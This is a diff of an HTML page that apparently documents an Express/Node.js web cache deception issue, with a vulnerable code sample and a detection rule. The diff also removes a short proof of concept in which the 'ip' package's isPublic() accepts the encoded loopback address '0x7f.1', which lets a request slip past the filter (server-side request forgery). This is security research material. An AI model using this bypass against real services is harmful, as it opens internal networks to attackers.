@@ -15,9 +15,9 @@
   
 <body>
 
-<h2>express/nodejs cache deception</h2>
+<h1>express/nodejs cache deception</h1>
 
-<p>cache_deception.js</p>
+<h3>cache_deception.js</h3>
 <pre>
 <code>
 const express = require('express')
@@ -36,7 +36,7 @@ app.listen(port, () => {
   
 <br></br>
   
-<p>cache_deception_rule.yaml</p>
+<h3>cache_deception_rule.yaml</h3>
 <pre>
 <code>
 rules:
@@ -60,25 +60,6 @@ rules:
     languages: [js, javascript]
 </code>
 </pre>
-
-
-</pre>
-<h1>PoC</h1>
- <code>
-        <br>var ip = require('ip');</br>
-        <br>console.log(ip.isPublic("0x7f.1")); // true</br>
-        <br>// Check IP and IF IP is not public do HTTP req ==> SSRF</br>
-        <br>var my_ip = "0x7f.1"; // private but ip package doesn't recognize as private!</br>
-        <br>// var my_ip2 = "google.com"; // public --> fetch will be completed</br>
-        <br>// var my_ip3 = "127.0.0.1"; // private --> else statement will be run</br>
-        <br>if (ip.isPublic(my_ip)) {</br>
-            <br>fetch("http://" + my_ip).then((response) => {</br>
-                <br>console.log(response);</br>
-            <br>});</br>
-        <br>} else {</br>
-            <br>console.log("IP is not public");</br>
-        <br>}</br>
- </code>
   
     
 <video width="320" height="240" controls>
